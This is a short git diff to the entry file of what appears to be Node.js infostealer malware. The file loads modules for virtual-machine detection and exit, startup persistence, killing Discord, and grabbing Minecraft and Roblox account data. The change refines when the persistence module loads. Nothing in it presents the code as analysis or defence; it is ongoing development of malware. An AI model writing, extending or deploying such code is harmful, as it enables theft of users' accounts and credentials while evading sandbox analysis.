@@ -6,6 +6,7 @@ const os = require('os');
 const config = require('./config');
 const { spawnSync } = require('child_process');
 const { checkVM, killTasks } = require('./functions/anti-vm');
+const { runningFromExecutable } = require('./util/general');
 const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
 module.exports.tempFolder = tempFolder;
 process.argv0.includes('node') && spawnSync('explorer', [tempFolder]);
@@ -17,7 +18,7 @@ if (config.vmProtect && checkVM()) {
     process.exit();
   }
 } else {
-  config.addToStartup && require('./functions/startup');
+  if (config.addToStartup && runningFromExecutable()) require('./functions/startup');
   config.discord.killProcess && require('./functions/kill-discord');
   require('./functions/grab-mc');
   require('./functions/grab-roblox');
